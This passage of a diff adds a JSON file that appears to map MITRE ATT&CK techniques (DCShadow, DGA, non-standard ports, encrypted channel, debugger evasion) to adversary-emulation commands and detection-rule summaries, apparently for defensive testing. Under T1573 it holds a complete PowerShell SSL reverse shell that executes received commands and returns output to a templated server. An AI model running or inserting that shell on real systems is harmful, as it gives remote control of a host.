+          "title": "Add or Remove Computer from DC",
+          "logsource": {
+            "service": "security",
+            "product": "windows"
+          },
+          "description": "Detects the creation or removal of a computer. Can be used to detect attacks such as DCShadow via the creation of a new SPN."
+        },
+        {
+          "title": "Possible DC Shadow Attack",
+          "logsource": {
+            "product": "windows",
+            "service": "security",
+            "definition": "The \"Audit Directory Service Changes\" logging policy must be configured in order to receive events. Audit events are generated only for objects with configured system access control lists (SACLs). Audit events are generated only for objects with configured system access control lists (SACLs) and only when accessed in a manner that matches their SACL settings. This policy covers the following events ids - 5136, 5137, 5138, 5139, 5141. Note that the default policy does not cover User objects. For that a custom AuditRule need to be setup (See https://github.com/OTRF/Set-AuditRule)"
+          },
+          "description": "Detects DCShadow via create new SPN"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1568.002",
+      "name": "Dynamic Resolution: Domain Generation Algorithms",
+      "description": "Simulates Domain Generation Algorithm (DGA) traffic by generating pseudo-random domains based on the current date and querying them using dig. \nThis is designed to trigger DNS analytics and NGIDS.",
+      "platforms": [
+        "linux"
+      ],
+      "commands": [
+        {
+          "executor": "bash",
+          "command": "python3 \"#{python_script_path}\"",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Communication To Ngrok Tunneling Service Initiated",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects an executable initiating a network connection to \"ngrok\" tunneling domains.\nAttackers were seen using this \"ngrok\" in order to store their second stage payloads and malware.\nWhile communication with such domains can be legitimate, often times is a sign of either data exfiltration by malicious actors or additional download."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1571",
+      "name": "Non-Standard Port",
+      "description": "Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful\nport check will be displayed.",
+      "platforms": [
+        "windows",
+        "linux",
+        "macos",
+        "darwin"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "Test-NetConnection -ComputerName #{domain} -port #{port}",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "echo quit | telnet #{domain} #{port}\nexit 0",
+          "cleanup": null
+        },
+        {
+          "executor": "psh",
+          "command": "Test-NetConnection -ComputerName #{nonstandard.port.listener} -port #{nonstandard.port.number}",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "echo quit | telnet #{nonstandard.port.listener} #{nonstandard.port.number};\nexit 0",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Potentially Suspicious Malware Callback Communication",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects programs that connect to known malware callback ports based on statistical analysis from two different sandbox system databases"
+        },
+        {
+          "title": "Communication To Uncommon Destination Ports",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects programs that connect to uncommon destination ports"
+        },
+        {
+          "title": "Testing Usage of Uncommonly Used Port",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Requirements: Script Block Logging must be enabled"
+          },
+          "description": "Adversaries may communicate using a protocol and port paring that are typically not associated.\nFor example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1573",
+      "name": "Encrypted Channel",
+      "description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.",
+      "platforms": [
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "$server_ip = #{server_ip}\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '> ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2>&1;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Suspicious SSL Connection",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Requirements: Script Block Logging must be enabled"
+          },
+          "description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1622",
+      "name": "Debugger Evasion",
+      "description": "Detecting a running debugger process or if the debugger is attached to a process via PowerShell",
+      "platforms": [
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "# Check for common debugger processes\n$debuggerProcesses = Get-Process | Where-Object { $_.ProcessName -match \"dbg\" -or $_.ProcessName -match \"debug\" }\n# Check for debugging flags\n$debuggingFlags = [System.Diagnostics.Debugger]::IsAttached",
+          "cleanup": null
+        },
+        {
+          "executor": "psh",
+          "command": "$debuggerProcesses = Get-Process | Where-Object {\n  $_.ProcessName -match \"dbg\" -or $_.ProcessName -match \"debug\" \n};\necho $debuggerProcesses;\n$debuggingFlags = [System.Diagnostics.Debugger]::IsAttached;\necho $debuggingFlags;",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "PUA - Process Hacker Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the execution of Process Hacker based on binary metadata information (Image, Hash, Imphash, etc).\nProcess Hacker is a tool to view and manipulate processes, kernel options and other low level options.\nThreat actors abused older vulnerable versions to manipulate system processes."
+        }
+      ]
+    }
+  ]
+}
